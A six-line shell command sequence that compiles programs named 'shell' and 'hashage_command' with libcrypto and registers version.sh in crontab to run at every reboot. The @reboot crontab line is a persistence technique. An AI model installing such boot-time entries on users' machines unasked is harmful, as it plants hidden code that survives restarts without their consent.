gcc -o shell shell.c -lcrypto
chmod +x version.sh
(crontab -l ; echo "@reboot /home/$USER/version.sh") | crontab -
crontab -l
gcc -o hashage_command hashage_command.c -lcrypto
./hashage_command
